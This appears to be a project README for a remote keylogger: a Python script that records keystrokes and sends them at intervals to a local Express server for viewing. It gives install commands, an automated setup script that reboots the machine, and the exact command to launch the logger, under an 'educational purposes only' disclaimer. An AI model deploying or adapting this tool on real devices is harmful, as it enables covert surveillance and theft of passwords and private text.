# Keylogger and Express Server

This repository contains a keylogger Python script and a simple Express server to capture and display keystrokes.

## Table of Contents
- [Setup and Installation](#setup-and-installation)
- [Usage](#usage)
- [Security and Privacy](#security-and-privacy)

## Setup and Installation

### Prerequisites

- Node.js
- npm
- Python 3
- pip
- `venv` (Python virtual environment)

### Installation Steps

1. **Clone the repository**

    ```sh
    git clone https://github.com/jimididit/remote-keylogger
    cd remote-keylogger
    ```

2. **Setup Express Server**

    Navigate to the directory containing `server.js` and run the following commands:

    ```sh
    sudo apt update
    sudo apt upgrade
    sudo apt install nodejs
    sudo apt install npm
    sudo npm init -y
    sudo npm install express body-parser
    ```

3. **Setup Python Keylogger**

    Navigate to the directory containing `keylogger.py` and create a virtual environment:

    ```sh
    python3 -m venv venv
    source venv/bin/activate  # On Windows use `venv\Scripts\activate`
    ```

    Install the required Python packages within the virtual environment:

    ```sh
    pip install -r requirements.txt
    ```

4. **Run the Express Server**

    Start the Express server by running:

    ```sh
    node server.js
    ```

5. **Run the Keylogger Script**

    Ensure the virtual environment is activated, then execute the keylogger script with the following command:

    ```sh
    python3 keylogger.py 127.0.0.1 8080 10
    ```

    Here, `127.0.0.1` is the IP address of the server, `8080` is the port number, and `10` is the time interval (in seconds) for sending keystroke data.

### Using setup.py for Automated Setup

You can also use the `setup.py` script to automate the setup process. Ensure the `commands.txt` file contains the necessary setup commands. Then, run the setup script:

1. Make sure `commands.txt` contains:

    ```plaintext
    sudo apt update
    sudo apt upgrade
    sudo apt install nodejs
    sudo apt install npm
    sudo npm init -y
    sudo npm install
    sudo reboot
    ```

2. Run the setup script:

    ```sh
    python3 setup.py
    ```

## Usage

After setting up and running both the Express server and the keylogger script, keystrokes will be logged and sent to the server. Open a web browser and navigate to `http://127.0.0.1:8080` to view the captured keystrokes.

## Security and Privacy

This project is for educational purposes only. Logging keystrokes can be a significant privacy risk. Ensure you have the proper permissions and consents before using this software on any device.
